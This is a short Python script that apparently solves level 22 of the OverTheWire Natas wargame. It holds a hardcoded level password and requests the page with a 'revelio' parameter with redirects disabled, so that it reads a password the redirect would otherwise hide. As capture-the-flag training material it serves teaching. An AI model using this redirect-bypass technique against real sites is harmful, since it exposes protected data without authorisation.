# Natas22 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL     = "http://natas22.natas.labs.overthewire.org/"

auth_name = 'natas22'
auth_pass = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# By viewing the source-code, it can be noted that the
# Password will be revealed if a certain request is met:
PARAMS = dict(revelio=True)

# The user can remain on the page and view the output, by
# simply dis-allowing redirects.
r = s.get(URL, params=PARAMS, allow_redirects=False)

for x in r.iter_lines():
    if "Password" in x:
        print x[:-6]